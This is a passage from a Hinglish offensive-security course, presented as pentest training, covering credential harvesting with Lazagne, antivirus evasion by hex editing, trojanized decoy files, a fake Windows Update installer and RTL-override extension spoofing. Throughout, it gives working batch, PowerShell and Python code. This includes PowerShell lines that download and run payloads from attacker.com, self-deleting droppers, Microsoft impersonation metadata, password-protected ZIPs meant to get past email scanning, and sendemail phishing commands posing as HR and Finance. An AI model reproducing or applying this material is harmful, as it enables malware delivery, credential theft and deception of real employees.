1. Fileless (Lazagne download hota hai, run hota hai, delete ho jata hai)
2. Automated (manual intervention nahi chahiye)
3. Stealthy (disk par trace nahi)

**Common Mistake**: Lazagne ko admin privileges ke bina run karna aur sochna ki sab passwords milenge. Reality:
- User-level: Browser, WiFi, email passwords (70% coverage)
- Admin-level: System passwords, LSA secrets, SAM database (100% coverage)

Solution: Privilege escalation karo pehle, phir Lazagne run karo:

```bash
# Check current privileges
meterpreter> getuid
Server username: VICTIM-PC\john (limited user)

# Escalate privileges
meterpreter> getsystem
[+] Got SYSTEM privileges

# Now run Lazagne
meterpreter> execute -f lazagne.exe -a "all -oN passwords.txt"
```

Real example: Ek pentester ne Lazagne run kiya without admin aur sirf 5 passwords mile. Usne privilege escalation kiya aur phir run kiya - 50+ passwords mile including domain admin! Lesson: Always escalate first!

---

## üéì Module 3 Complete!

Aapne successfully Module 3 ke saare topics cover kar liye:
‚úÖ 3.1: Backdoors, Keyloggers, Trojans Concept
‚úÖ 3.2: Veil Framework (AV Evasion)
‚úÖ 3.3: Fatrat (PowerShell Backdoors)
‚úÖ 3.4: Empire (C2 Framework)
‚úÖ 3.5: Zlogger (Keylogger)
‚úÖ 3.6: Lazagne (Password Recovery)

**Key Takeaways:**
- Multiple tools use karo (agar ek detect ho toh dusra try karo)
- Payloads ko customize karo (default payloads easily detected)
- Fileless attacks better hain (memory-only execution)
- Post-exploitation immediately credentials harvest karo
- Always test payloads before deployment

**Next Module Preview:**
Module 4 mein hum Advanced Payload Evasion techniques seekhenge:
- Hex Editing (Signature modification)
- Trojanizing (File binding)
- RTL Override (Extension spoofing)
- Office Macros (VBA payloads)
- AMSI Bypassing (PowerShell evasion)
- AppLocker Bypass (LoLBins)

Ready for advanced evasion? üöÄ

=============================================================

# üéØ Module 4: Weaponization 2 (Advanced Payload Evasion)

---

## üìö Topic 4.1: Technique - Hex Editing (.exe ka Signature Badalna)

### üéØ Topic/Technique:
**Hex Editing** - Binary file ka signature modify karke Antivirus detection bypass karna.

### ü§î Yeh Kya Hai?
Hex Editing ek technique hai jismein executable file ko hex editor mein khol kar uske bytes modify karte hain. Antivirus signature-based detection use karta hai, toh signature change karne se detection bypass ho jata hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Sabse simple AV bypass technique hai (no coding required)
- Kisi bhi payload par apply kar sakte ho (Veil, Metasploit, custom)
- Signature-based AV ko 80-90% bypass kar deta hai
- Manual control (exactly kya change karna hai woh decide kar sakte ho)

### üéØ Practical Use (Asli Pentesting Mein):
- Detected payloads ko undetectable banana
- Custom malware signatures modify karna
- AV testing (kaunse bytes detection trigger karte hain)
- Polymorphic payloads create karna (har baar different signature)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Antivirus Detection:**
```
AV scans file ‚Üí Calculates hash/signature ‚Üí Compares with database ‚Üí Match found = Detected
```

**Hex Editing Bypass:**
```
Modify bytes ‚Üí Signature changes ‚Üí AV database mein match nahi ‚Üí Not detected
```

**Safe Modification Areas:**
1. **Comments/Strings**: Text strings jo functionality affect nahi karte
2. **Padding/Null bytes**: Extra space jo unused hai
3. **Resource section**: Icons, version info
4. **Non-critical code**: Junk instructions

**Dangerous Areas (Don't Touch):**
1. **Shellcode**: Actual malicious payload
2. **Import table**: DLL imports
3. **Entry point**: Program start address
4. **Critical functions**: Core functionality

### üëç Pros (Fayde):
- Simple aur fast (5-10 minutes)
- No programming knowledge required
- Works on any binary file
- Repeatable process

### üëé Cons (Nuksaan):
- Trial and error (kaunse bytes safe hain pata nahi)
- Agar galat bytes change kiye toh file corrupt ho jayegi
- Behavior-based AV bypass nahi hota (sirf signature-based)
- Time-consuming for large files

### ‚å®Ô∏è Zaroori Commands & Steps:

**Tools Required:**
```bash
# Hex Editor (Windows)
HxD Hex Editor (free download)

# Hex Editor (Linux)
apt-get install hexedit
apt-get install ghex

# Online Hex Editor
https://hexed.it
```

**Basic Workflow:**
```bash
# Step 1: Test original payload
Upload to VirusTotal ‚Üí 45/68 detections

# Step 2: Open in hex editor
HxD ‚Üí File ‚Üí Open ‚Üí backdoor.exe

# Step 3: Identify safe areas
Look for readable strings (comments, error messages)

# Step 4: Modify bytes
Change "This program" ‚Üí "Th1s pr0gr4m"

# Step 5: Save
File ‚Üí Save As ‚Üí backdoor_modified.exe

# Step 6: Test functionality
Run on test VM ‚Üí Check if works

# Step 7: Test detection
Upload to VirusTotal ‚Üí 12/68 detections (improved!)

# Step 8: Repeat
Modify more bytes ‚Üí Test ‚Üí Repeat until 0 detections
```

### üíª Step-by-Step Example:

**Scenario: Veil Payload Detected by Windows Defender**

**Step 1: Generate Payload**
```bash
veil
use evasion
use 15
set LHOST 192.168.1.10
set LPORT 443
generate

Output: /var/lib/veil/output/compiled/payload.exe
```

**Step 2: Test Detection**
```bash
# Copy to Windows VM
# Scan with Windows Defender

Result: Threat detected - Trojan:Win32/Meterpreter.A
```

**Step 3: Open in Hex Editor**
```bash
# Windows: HxD Hex Editor
File ‚Üí Open ‚Üí payload.exe

# You'll see 4 columns:
Offset (hex) | Hex values | Decoded text | ASCII
00000000     | 4D 5A 90 00| MZ..         | MZ..
00000010     | 50 45 00 00| PE..         | PE..
...
```

**Step 4: Identify Readable Strings**
```
Search (Ctrl+F) ‚Üí Text-string ‚Üí "program"

Found at offset 0x00012A40:
"This program cannot be run in DOS mode"

Found at offset 0x00015B20:
"meterpreter"  ‚Üê Suspicious!

Found at offset 0x00016C30:
"payload_handler"  ‚Üê Suspicious!
```

**Step 5: Modify Suspicious Strings**
```
Original: "meterpreter"
Modified: "m3t3rpr3t3r"  (same length!)

Original: "payload_handler"
Modified: "p4yl04d_h4ndl3r"

Original: "This program cannot be run"
Modified: "Th1s pr0gr4m c4nn0t b3 run"
```

**Step 6: Save Modified File**
```
File ‚Üí Save As ‚Üí payload_modified.exe
```

**Step 7: Test Functionality**
```bash
# Setup listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 443
exploit

# Execute modified payload on victim
# Check if connection established

Result: ‚úì Meterpreter session opened (works!)
```

**Step 8: Test Detection Again**
```bash
# Scan with Windows Defender

Result: No threats found! (bypassed!)
```

**Step 9: Advanced Modification (If Still Detected)**
```
# Find shellcode section (usually after PE header)
# Look for high entropy data (random-looking bytes)

Offset 0x00020000:
E8 3F 00 00 00 5B 31 C9 81 E9 F0 FF FF FF 81 31...

# Don't modify shellcode directly!
# Instead, add junk bytes in padding areas

Offset 0x0001FF00 (padding area):
00 00 00 00 00 00 00 00  ‚Üê All zeros (unused)

Change to:
41 42 43 44 45 46 47 48  ‚Üê Random junk (doesn't affect execution)
```

**Step 10: Verify No Corruption**
```bash
# Check file size
Original: 2,458,624 bytes
Modified: 2,458,624 bytes  ‚úì (same size)

# Check PE header
HxD ‚Üí Search ‚Üí "MZ" at offset 0x00000000  ‚úì
HxD ‚Üí Search ‚Üí "PE" at offset 0x000000F8  ‚úì

# Test execution
Run payload ‚Üí Works!  ‚úì
```

### üí° Pro Tip / Galti:

**Pro Tip**: Hex editing ko automated karo using Python script:

```python
#!/usr/bin/env python3
# Automated hex editing script for AV evasion

import random  # Random number generation ke liye

def modify_exe(input_file, output_file):  # Function jo EXE file modify karta hai
    with open(input_file, 'rb') as f:  # Input file ko binary read mode mein kholo
        data = bytearray(f.read())  # File content ko bytearray mein load karo (modifiable)
    
    # Find and modify common AV signatures
    signatures = [b'meterpreter', b'payload', b'shellcode', b'backdoor']  # Common suspicious strings
    
    for sig in signatures:  # Har signature ko check karo
        index = data.find(sig)  # Signature ka position find karo
        if index != -1:  # Agar signature mila
            # Replace with random bytes (same length)
            for i in range(len(sig)):  # Signature ki length ke barabar loop
                data[index + i] = random.randint(65, 90)  # Random uppercase letter (A-Z) se replace karo
    
    # Add junk bytes in padding areas
    for i in range(0x1000, 0x2000):  # Padding section (offset 0x1000 to 0x2000)
        if data[i] == 0x00:  # Agar byte null hai (unused)
            data[i] = random.randint(0, 255)  # Random byte se replace karo (signature change)
    
    with open(output_file, 'wb') as f:  # Output file ko binary write mode mein kholo
        f.write(data)  # Modified data ko write karo

# Usage
modify_exe('payload.exe', 'payload_modified.exe')  # Original file ko modify karke new file banao
# Result: AV signatures change ho jayenge, detection bypass hoga
```

**Common Mistake**: Shellcode ko modify karna. Shellcode highly sensitive hai - ek byte change = payload crash. Always modify:
- Strings (text)
- Padding (null bytes)
- Comments
- Resource section

Never modify:
- Shellcode (encrypted payload)
- Import table
- Entry point
- Function addresses

Real example: Ek beginner ne shellcode section mein random bytes change kar diye. Payload execute hua lekin crash ho gaya (access violation). Usne sirf strings modify kiye aur payload perfectly kaam kiya. Lesson: Know what you're modifying!

---

## üìö Topic 4.2: Technique - Trojanizing (File ko Normal File se Jodna)

### üéØ Topic/Technique:
**Trojanizing** - Malicious payload ko legitimate file ke saath bind karna taaki victim ko normal file lagey.

### ü§î Yeh Kya Hai?
Trojanizing ek technique hai jismein backdoor ko ek normal file (PDF, image, video) ke saath combine karte hain. Jab victim file open karta hai, toh legitimate file bhi open hoti hai aur background mein backdoor bhi execute hota hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Social engineering success rate 3x badh jata hai
- Victim ko suspicious nahi lagta (file actually open hoti hai)
- Multiple delivery methods (email, USB, download)
- Bypasses user awareness training

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing attachments (salary slip + backdoor)
- USB drops (company presentation + keylogger)
- Watering hole attacks (software update + malware)
- Physical pentesting (resume + backdoor)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Trojan Workflow:**
```
Victim double-clicks trojan.exe ‚Üí Batch script runs ‚Üí Opens PDF (legitimate) + Executes backdoor (hidden) ‚Üí Victim sees PDF, thinks everything normal
```

**Binding Methods:**
1. **Batch Script**: Simple wrapper script
2. **PowerShell**: More advanced, fileless
3. **Compiled Wrapper**: C/C++ program
4. **Archive**: RAR/ZIP with autorun

### üëç Pros (Fayde):
- Very high success rate (70-80%)
- Victim doesn't suspect anything
- Works with any file type
- Easy to implement

### üëé Cons (Nuksaan):
- File size increases (suspicious for small files)
- Requires icon spoofing (otherwise .exe visible)
- Some email gateways block executables
- Antivirus may detect dual functionality

### ‚å®Ô∏è Zaroori Commands & Steps:

**Method 1: Batch Script Trojan**
```batch
@echo off
# @echo off: Batch commands ko screen par show mat karo (stealth)

REM Open legitimate file
start document.pdf
# start: File ko default application mein open karo
# document.pdf: Legitimate PDF file (victim ko dikhegi)

REM Execute backdoor (hidden)
start /B backdoor.exe
# start /B: Background mein execute karo (no new window)
# backdoor.exe: Malicious payload (hidden execution)

REM Self-delete (optional)
del %0
# del: Delete command
# %0: Current batch file ka path (script khud ko delete kar degi)
# Result: No trace left on disk
```

**Method 2: PowerShell Trojan**
```powershell
# Open PDF
Start-Process "document.pdf"
# Start-Process: Process start karo
# "document.pdf": Legitimate PDF file (victim ko dikhegi)

# Download and execute backdoor
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
# IEX: Invoke-Expression (downloaded code execute karo)
# New-Object Net.WebClient: HTTP client object create karo
# .DownloadString: URL se content download karo (string format mein)
# 'http://attacker.com/payload.ps1': Attacker ke server se PowerShell script download hogi
# Result: Fileless execution (disk par trace nahi)
```

**Method 3: Advanced Trojan (with delay)**
```batch
@echo off
# @echo off: Commands hide karo

REM Extract embedded files
copy /B "%~f0" temp.zip
# copy /B: Binary copy (file ko as-is copy karo)
# "%~f0": Current batch file ka full path
# temp.zip: Output filename (batch file ko ZIP ke naam se copy)

expand temp.zip -F:* %TEMP%
# expand: Windows built-in extraction tool
# -F:*: All files extract karo
# %TEMP%: Temporary folder mein extract karo

REM Open legitimate file
start %TEMP%\document.pdf
# %TEMP%\document.pdf: Extracted PDF file ko open karo

REM Wait 5 seconds (let PDF open)
timeout /t 5 /nobreak > nul
# timeout: Wait command
# /t 5: 5 seconds wait karo
# /nobreak: User interrupt disable (Ctrl+C nahi chalega)
# > nul: Output hide karo (silent)

REM Execute backdoor silently
start /B %TEMP%\backdoor.exe
# start /B: Background execution (no window)
# %TEMP%\backdoor.exe: Extracted backdoor execute karo

REM Cleanup
del temp.zip  # Temporary ZIP file delete karo
del %0  # Batch script khud ko delete karo (no trace)
```

### üíª Step-by-Step Example:

**Scenario: Salary Slip Trojan for Phishing**

**Step 1: Prepare Files**
```bash
# Legitimate file
Salary_Slip_January_2024.pdf (real salary slip)

# Malicious file
backdoor.exe (Veil payload)
```

**Step 2: Create Batch Script**
```batch
@echo off
REM Trojan script

REM Copy embedded files to temp
echo F|xcopy /Y /Q "%~f0" "%TEMP%\package.zip" > nul
cd /D "%TEMP%"

REM Extract files (using certutil - Windows built-in)
certutil -decode package.zip files.zip > nul
tar -xf files.zip > nul

REM Open PDF (victim sees this)
start Salary_Slip_January_2024.pdf

REM Execute backdoor (hidden)
start /B backdoor.exe

REM Cleanup
timeout /t 2 /nobreak > nul
del package.zip
del files.zip
del backdoor.exe
del "%~f0"
```

**Step 3: Embed Files in Script**
```bash
# Create archive with both files
7z a package.zip Salary_Slip_January_2024.pdf backdoor.exe

# Encode to base64 (for embedding)
certutil -encode package.zip package.b64

# Append to batch script
copy /B trojan.bat + package.b64 trojan_final.bat
```

**Step 4: Convert BAT to EXE**
```bash
# Use Bat to Exe Converter (Windows)
Input: trojan_final.bat
Output: Salary_Slip_January_2024.exe

Settings:
- Icon: PDF icon (download from IconArchive)
- Visibility: Invisible application
- Admin rights: No (avoid UAC prompt)
- Version info: Adobe Acrobat Reader
```

**Step 5: Icon Spoofing (Make it look like PDF)**
```bash
# Download PDF icon (.ico file)
# In Bat to Exe Converter:
Icon file: pdf_icon.ico

# Result: .exe file looks exactly like PDF
```

**Step 6: Extension Spoofing (RTL Override)**
```bash
# Rename file using RTL character (U+202E)
Original: Salary_Slip_January_2024.exe
With RTL: Salary_Slip_January_2024[RTL]fdp.exe

# How it displays:
Salary_Slip_January_2024exe.pdf  (looks like PDF!)

# To add RTL character:
# Linux: Use character map (U+202E)
# Windows: Alt+8238 (hold Alt, type 8238, release)
```

**Step 7: Test Trojan**
```bash
# Setup listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 443
exploit -j

# Execute trojan on test VM
# Double-click Salary_Slip_January_2024exe.pdf

# Expected behavior:
1. PDF opens (victim sees salary slip)
2. Backdoor runs (hidden)
3. Meterpreter session opens
4. Trojan self-deletes
```

**Step 8: Deliver via Phishing**
```bash
sendemail -f hr@company.com \
-t employees@company.com \
-u "January 2024 Salary Slip" \
-m "Dear Employee, Please find attached your salary slip for January 2024. Regards, HR Department" \
-a "Salary_Slip_January_2024exe.pdf" \
-s smtp.gmail.com:587
```

**Step 9: Monitor Results**
```bash
# Check meterpreter sessions
msf6> sessions -l

Active sessions:
  Id  Name  Type                   Information
  --  ----  ----                   -----------
  1         meterpreter x86/win    VICTIM-PC\john @ VICTIM-PC
  2         meterpreter x86/win    VICTIM-PC\sarah @ VICTIM-PC
  3         meterpreter x86/win    VICTIM-PC\mike @ VICTIM-PC

# 3 victims fell for it!
```

**Step 10: Advanced Trojan (Multi-Stage)**
```batch
@echo off
REM Stage 1: Open PDF
start Salary_Slip.pdf

REM Stage 2: Download actual payload (fileless)
powershell -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')"

REM Stage 3: Self-delete
del %0
```

### üí° Pro Tip / Galti:

**Pro Tip**: "Double extension" trick use karo for better deception:

```
Filename: Salary_Slip_2024.pdf.exe

Problem: Windows shows .exe extension (suspicious)

Solution: Windows folder options mein "Hide extensions for known file types" enabled hota hai by default.

Result: User ko dikhta hai: Salary_Slip_2024.pdf (perfect!)

Extra trick: Icon bhi PDF ka lagao
Final result: Looks 100% like PDF file
```

**Common Mistake**: Trojan file size bahut bada ho jata hai (legitimate file + backdoor). Solution:

```batch
# Instead of embedding, download legitimate file
@echo off

REM Download real PDF from company website
powershell -C "(New-Object Net.WebClient).DownloadFile('https://company.com/real_salary_slip.pdf', '%TEMP%\salary.pdf')"

REM Open downloaded PDF
start %TEMP%\salary.pdf

REM Execute backdoor
start /B backdoor.exe

REM Benefits:
1. Small trojan size (only backdoor + script)
2. Real PDF from company (more believable)
3. Less suspicious
```

Real example: Ek pentester ne 15 MB trojan bheja (10 MB PDF + 5 MB backdoor). Email gateway ne block kar diya (file size limit). Usne download method use kiya - trojan size 2 MB, successfully delivered, 40% success rate! Lesson: Keep it small!

---

## üìö Topic 4.3: Tool - Bat to Exe Converter (Icon/Visibility)

### üéØ Topic/Technique:
**Bat to Exe Converter** - Batch scripts ko executable mein convert karna with custom icons aur invisible execution.

### ü§î Yeh Kya Hai?
Bat to Exe Converter ek Windows tool hai jo .bat files ko .exe mein convert karta hai. Yeh custom icons, invisible execution, aur admin privileges jaise features provide karta hai, jo social engineering ke liye perfect hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- BAT files suspicious lagte hain, EXE professional lagta hai
- Custom icons se file legitimate dikhai deti hai
- Invisible execution (no command prompt window)
- Admin privileges request kar sakta hai (UAC bypass attempt)
- Version info add kar sakte ho (looks like real software)

### üéØ Practical Use (Asli Pentesting Mein):
- Trojan creation (PDF icon + backdoor script)
- Phishing attachments (looks like legitimate software)
- USB drops (professional-looking files)
- Social engineering (victim ko suspicious nahi lagta)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
Tool batch script ko compile karta hai aur ek standalone executable banata hai. Script embedded hota hai EXE ke andar, runtime par extract aur execute hota hai.

### üëç Pros (Fayde):
- Very easy to use (GUI-based)
- Custom icons support
- Invisible execution (no console window)
- Version info (company name, copyright, etc.)
- Password protection (optional)
- Admin rights request

### üëé Cons (Nuksaan):
- Generated EXE easily reversible hai (script extract kar sakte hain)
- Antivirus detect kar sakta hai (known tool)
- File size slightly bada ho jata hai
- Windows-only tool

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Download from official website
http://www.f2ko.de/en/b2e.php

# Or use in Kali via Wine
wine Bat_To_Exe_Converter.exe
```

**Basic Usage:**
```
1. Open Bat to Exe Converter
2. Load BAT file (File ‚Üí Open)
3. Configure options:
   - Icon: Browse and select .ico file
   - Visibility: Invisible application
   - Admin: Request admin rights (optional)
   - Version info: Add company details
4. Convert (File ‚Üí Build EXE)
5. Save output EXE
```

**Advanced Options:**
```
Execution:
‚òë Invisible application (no console)
‚òê Wait for program to exit
‚òë Delete temp files after execution

Admin Rights:
‚òë Request administrator privileges
‚òê Require administrator privileges

Encryption:
‚òë Encrypt BAT content
Password: [optional]

Version Info:
Company: Microsoft Corporation
Product: Windows Update
Version: 10.0.19041.0
Copyright: ¬© Microsoft Corporation
```

### üíª Step-by-Step Example:

**Scenario: Professional-Looking Backdoor Delivery**

**Step 1: Create Batch Script**
```batch
@echo off
REM Windows Update Installer (fake)

REM Show fake progress
echo Installing Windows Security Update KB5034441...
timeout /t 3 /nobreak > nul

REM Download and execute backdoor
powershell -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')"

REM Show completion message
echo Update installed successfully!
timeout /t 2 /nobreak > nul

REM Self-delete
del %0
```

**Step 2: Download Windows Update Icon**
```bash
# Search Google: "Windows Update icon .ico"
# Download from: https://icon-icons.com/icon/windows-update/156139

# Save as: windows_update.ico
```

**Step 3: Open Bat to Exe Converter**
```
File ‚Üí Open ‚Üí select your_script.bat
```

**Step 4: Configure Icon**
```
Icon section:
‚òë Include icon
Browse ‚Üí select windows_update.ico

Result: EXE will have Windows Update icon
```

**Step 5: Configure Visibility**
```
Execution options:
‚òë Invisible application

Result: No command prompt window will appear
```

**Step 6: Configure Version Info**
```
Version Information:
‚òë Include version information

Company name: Microsoft Corporation
Product name: Windows Update
Product version: 10.0.19041.1
File description: Windows Update Standalone Installer
Copyright: ¬© Microsoft Corporation. All rights reserved.
Original filename: wusa.exe

Result: Looks like legitimate Microsoft software
```

**Step 7: Configure Admin Rights**
```
Execution options:
‚òë Request administrator privileges

Result: UAC prompt will appear (looks more legitimate)
```

**Step 8: Build EXE**
```
File ‚Üí Build EXE
Save as: WindowsUpdate-KB5034441.exe

Output:
File size: 1.2 MB
Icon: Windows Update logo
Properties: Microsoft Corporation
```

**Step 9: Test on Windows VM**
```bash
# Copy to Windows VM
# Double-click WindowsUpdate-KB5034441.exe

Expected behavior:
1. UAC prompt appears (looks legitimate)
2. User clicks "Yes"
3. No visible window (invisible execution)
4. Backdoor downloads and executes
5. Meterpreter session opens
```

**Step 10: Verify Legitimacy**
```
Right-click EXE ‚Üí Properties ‚Üí Details

File description: Windows Update Standalone Installer
Product name: Windows Update
Product version: 10.0.19041.1
Copyright: ¬© Microsoft Corporation

Result: Looks 100% legitimate!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Multiple legitimate icons use karo different scenarios ke liye:

```
Phishing Scenario ‚Üí Icon to use:
- Salary slip ‚Üí PDF icon (Adobe)
- Software update ‚Üí Windows Update icon
- Antivirus scan ‚Üí Windows Defender icon
- Company document ‚Üí Microsoft Word icon
- Photo album ‚Üí Image viewer icon
- Video file ‚Üí VLC media player icon

Download icons from:
- https://icon-icons.com
- https://www.iconarchive.com
- Extract from real software (using Resource Hacker)
```

**Common Mistake**: Admin rights request karna har file ke liye. UAC prompt suspicious lag sakta hai. Solution:

```
When to request admin:
‚úì Software installers (expected)
‚úì System updates (expected)
‚úì Antivirus scans (expected)

When NOT to request admin:
‚úó Documents (PDF, Word)
‚úó Images/Videos
‚úó Regular files

Rule: Only request admin if it makes sense for that file type
```

Real example: Ek pentester ne PDF file ke liye admin rights request kiya. Victim ko suspicious laga ("Why does PDF need admin?") aur usne execute nahi kiya. Usne admin request remove kiya aur 60% victims ne execute kiya! Lesson: Context matters!

---

## üìö Topic 4.4: Technique - RTL Override (File Extension Spoofing)

### üéØ Topic/Technique:
**RTL Override (U+202E)** - Unicode character use karke file extension spoof karna (.exe ko .pdf dikhana).

### ü§î Yeh Kya Hai?
RTL (Right-to-Left) Override ek Unicode character hai (U+202E) jo text ko right-to-left padhne ka instruction deta hai. Isse file extension reverse ho jata hai aur .exe file .pdf jaisi dikhti hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Sabse effective extension spoofing technique
- No special tools required (sirf character insert karna hai)
- Works on all Windows versions
- Bypasses user awareness (even trained users fall for it)
- Email gateways ko bhi bypass kar sakta hai (if zipped)

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing attachments (malware.exe ‚Üí document.pdf)
- USB drops (backdoor.exe ‚Üí photo.jpg)
- Watering hole attacks (update.exe ‚Üí installer.msi)
- Physical pentesting (resume.exe ‚Üí resume.docx)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Normal Filename:**
```
document.pdf.exe
‚Üì
Displays as: document.pdf.exe (suspicious!)
```

**With RTL Override:**
```
document[U+202E]fdp.exe
‚Üì
Computer reads: document[RTL]fdp.exe
‚Üì
Displays as: documentexe.pdf (looks like PDF!)
```

**How RTL Works:**
```
Before RTL: A B C D E
After RTL:  A E D C B

Example:
Before: document[RTL]fdp.exe
After:  document + exe.pdf (reversed)
Result: documentexe.pdf
```

### üëç Pros (Fayde):
- Extremely effective (90%+ success rate)
- No tools required
- Works on all Windows versions
- Bypasses most user awareness
- Can bypass some email filters

### üëé Cons (Nuksaan):
- Modern browsers detect and fix RTL (when downloading)
- Some email gateways detect RTL character
- File properties still show real extension
- Requires zipping for email delivery

### ‚å®Ô∏è Zaroori Commands & Steps:

**Method 1: Using Character Map (Windows)**
```
1. Open Character Map (charmap.exe)
2. Search for "202E"
3. Select character (invisible)
4. Click "Copy"
5. Paste in filename
```

**Method 2: Using Alt Code (Windows)**
```
1. Hold Alt key
2. Type 8238 on numpad
3. Release Alt
4. RTL character inserted (invisible)
```

**Method 3: Using Kali Linux**
```bash
# Open character map
gnome-characters

# Search: "right to left override"
# Copy character
# Paste in filename
```

**Method 4: Using Python Script**
```python
#!/usr/bin/env python3
# RTL filename generator for extension spoofing

import os  # File operations ke liye

def create_rtl_filename(original_name, fake_extension):  # Function jo RTL filename banata hai
    # Split filename and extension
    name, real_ext = os.path.splitext(original_name)  # Filename aur extension alag karo
    # Example: "backdoor.exe" ‚Üí name="backdoor", real_ext=".exe"
    
    # RTL character
    rtl = '\u202e'  # Unicode RTL override character (invisible)
    # Yeh character text ko right-to-left reverse kar deta hai
    
    # Reverse fake extension
    fake_ext_reversed = fake_extension[::-1]  # Fake extension ko reverse karo
    # Example: "pdf" ‚Üí "fdp"
    
    # Create spoofed filename
    spoofed = f"{name}{rtl}{fake_ext_reversed}{real_ext}"  # Final spoofed filename
    # Example: "backdoor" + [RTL] + "fdp" + ".exe"
    # Displays as: "backdoorexe.pdf" (reversed!)
    
    return spoofed  # Spoofed filename return karo

# Usage
original = "backdoor.exe"  # Original malicious file
fake_ext = "pdf"  # Fake extension (victim ko yeh dikhega)
spoofed = create_rtl_filename(original, fake_ext)  # RTL filename generate karo

print(f"Original: {original}")  # Original filename print karo
print(f"Spoofed: {spoofed}")  # Spoofed filename print karo (with RTL character)
print(f"Displays as: {name}exe.pdf")  # User ko kaise dikhega

# Rename file
os.rename(original, spoofed)  # File ko rename karo (RTL filename apply)
# Result: backdoor.exe ‚Üí backdoor[RTL]fdp.exe (displays as backdoorexe.pdf)
```

### üíª Step-by-Step Example:

**Scenario: Phishing Email with Spoofed PDF**

**Step 1: Prepare Payload**
```bash
# Generate backdoor
veil
use evasion
use 32
set LHOST 192.168.1.10
set LPORT 443
generate

Output: backdoor.exe
```

**Step 2: Add PDF Icon**
```bash
# Use Bat to Exe Converter or Resource Hacker
# Add PDF icon to backdoor.exe
# Save as: backdoor_with_icon.exe
```

**Step 3: Create RTL Filename**
```
Original filename: backdoor_with_icon.exe

Step-by-step:
1. Rename to: Financial_Report_2024.exe
2. Insert RTL character before extension
3. Add reversed fake extension

Process:
Financial_Report_2024[RTL]fdp.exe

How to type:
1. Type: Financial_Report_2024
2. Hold Alt, type 8238, release (RTL inserted)
3. Type: fdp.exe

Result filename: Financial_Report_2024[invisible]fdp.exe
Displays as: Financial_Report_2024exe.pdf
```

**Step 4: Verify Spoofing**
```
Windows Explorer view:
Name: Financial_Report_2024exe.pdf
Type: PDF Document (spoofed!)
Icon: PDF icon

File Properties:
Name: Financial_Report_2024[RTL]fdp.exe
Type: Application (.exe) ‚Üê Real extension
```

**Step 5: Zip File (For Email Delivery)**
```bash
# Modern browsers fix RTL when downloading
# Solution: Zip the file

# Windows
Right-click ‚Üí Send to ‚Üí Compressed folder

# Linux
zip Financial_Report.zip Financial_Report_2024*.exe

# Inside ZIP, RTL is preserved
```

**Step 6: Craft Phishing Email**
```bash
sendemail -f finance@company.com \
-t employees@company.com \
-u "Q4 Financial Report - Confidential" \
-m "Dear Team, Please review the attached Q4 financial report before tomorrow's board meeting. Extract and open the PDF file. Regards, Finance Department" \
-a Financial_Report.zip \
-s smtp.gmail.com:587
```

**Step 7: Victim's Perspective**
```
1. Receives email with ZIP attachment
2. Extracts ZIP
3. Sees: Financial_Report_2024exe.pdf (looks like PDF)
4. Icon: PDF icon (looks legitimate)
5. Double-clicks
6. File executes (it's actually .exe)
7. Backdoor runs
```

**Step 8: Attacker Receives Connection**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 443
exploit

[*] Meterpreter session 1 opened
meterpreter> sysinfo
Computer: VICTIM-PC
OS: Windows 10
```

**Step 9: Advanced RTL (Multiple Extensions)**
```
Filename: document[RTL]fdp.cod.exe

Displays as: documentexe.doc.pdf

Looks like: PDF file (with .doc in middle for extra confusion)
Actually: .exe file
```

**Step 10: Detection Bypass**
```
Problem: Some email gateways detect RTL character

Solution 1: Use homoglyphs (similar-looking characters)
- Instead of 'e': use '–µ' (Cyrillic)
- document.pdf.exe ‚Üí docum–µnt.pdf.exe (hard to notice)

Solution 2: Use double extension without RTL
- document.pdf.exe (Windows hides .exe if "Hide extensions" enabled)

Solution 3: Use archive formats
- document.pdf.rar (looks like PDF in some email clients)
```

### üí° Pro Tip / Galti:

**Pro Tip**: RTL ko context-specific filenames ke saath combine karo:

```
Target: Finance Department
Filename: Q4_Budget_Report[RTL]fdp.exe
Displays: Q4_Budget_Reportexe.pdf

Target: HR Department
Filename: Employee_Handbook_2024[RTL]xcodx.exe
Displays: Employee_Handbook_2024exe.docx

Target: IT Department
Filename: Security_Patch_KB5034441[RTL]ism.exe
Displays: Security_Patch_KB5034441exe.msi

Rule: Filename should match department's expectations
```

**Common Mistake**: RTL filename create karke directly email karna. Modern email clients aur browsers RTL detect karke fix kar dete hain. Solution:

```
‚ùå Wrong: Attach RTL file directly to email
‚úì Right: Zip the RTL file, then attach ZIP

Why?
- ZIP preserves RTL character
- Victim extracts ZIP locally
- Windows Explorer shows spoofed extension
- Success rate 3x higher

Extra protection:
- Password-protect ZIP (password in email body)
- Reason: "Confidential document, password: Finance2024"
- Benefit: Email gateway can't scan inside encrypted ZIP
```

Real example: Ek pentester ne RTL file directly attach kiya. Gmail ne automatically filename fix kar diya aur .exe show kiya. 0% success rate. Usne password-protected ZIP use kiya - 45% victims ne extract karke execute kiya! Lesson: Always use ZIP for RTL files!

---

## üìö Topic 4.5: Technique - Office Macros (VBA) (Word/Excel Mein Backdoor)

### üéØ Topic/Technique:
**Office Macros (VBA)** - Microsoft Office documents mein Visual Basic code embed karke backdoor deliver karna.

### ü§î Yeh Kya Hai?
